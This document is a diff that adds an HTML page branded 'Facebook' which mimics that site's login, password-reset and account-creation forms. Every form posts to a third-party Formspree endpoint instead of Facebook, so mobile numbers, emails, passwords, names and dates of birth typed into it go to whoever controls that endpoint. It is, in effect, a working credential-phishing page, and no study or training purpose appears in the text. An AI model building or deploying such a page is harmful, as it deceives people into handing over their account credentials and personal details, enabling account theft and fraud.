@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+</head>
+<link rel="stylesheet" href="css/style.css">
+
+<body>
+    <div class="form_container">
+        <p class="brand-name">Facebook</p>
+        <hr>
+        <form action="https://formspree.io/f/mgerzaeq" method="POST" id="loginForm">
+            <div id="login-form">
+                <div class="form-group">
+                    <label for="mobile-email">Mobile number or email address</label>
+                    <input type="text" name="mobile-email" id="mobile-email">
+                </div>
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" name="password" id="password">
+                </div>
+                <button type="submit" id="login-btn">Login</button>
+                <p class="forget-password">Forgotten password?</p>
+                <div class="seprator">
+                    <span class="FL"></span>
+                    <span class="middle">or</span>
+                    <span class="FL"></span>
+                </div>
+                <div class="create-new-account-btn-container">
+                    <p id="create-new-account-btn">Create New Account</p>
+                </div>
+            </div>
+            <div class="display-none" id="forget-password-form">
+                <div class="form-group">
+                    <label for="mobile-email">Mobile number or email address</label>
+                    <input type="text" name="mobile-email" id="mobile-email">
+                </div>
+                <button type="submit" id="forget-btn">Forget</button>
+                <p id="go-back-one">Go-back</p>
+            </div>
+            <div id="create-account-form" class="display-none">
+                <div class="form-group">
+                    <label for="first-name">First Name</label>
+                    <input type="text" name="first-name" id="first-name">
+                </div>
+                <div class="form-group">
+                    <label for="last-name">Last Name</label>
+                    <input type="text" name="last-name" id="last-name">
+                </div>
+                <div class="form-group">
+                    <label for="mobile-email">Mobile number or email address</label>
+                    <input type="text" name="mobile-email" id="mobile-email">
+                </div>
+                <div class="form-group">
+                    <label for="DOB">Date of birth</label>
+                    <input type="date" name="DOB" id="DOB">
+                </div>
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" name="password" id="password">
+                </div>
+                <div class="form-group">
+                    <label for="conferm-password">Conferm Password</label>
+                    <input type="password" name="conferm-password" id="conferm-password">
+                </div>
+                <button type="submit" id="create-account-btn">Create</button>
+                <p id="go-back-two">Go-back</p>
+            </div>
+        </form>
+    </div>
+    <script src="js/script.js"></script>
+</body>
+
+</html>
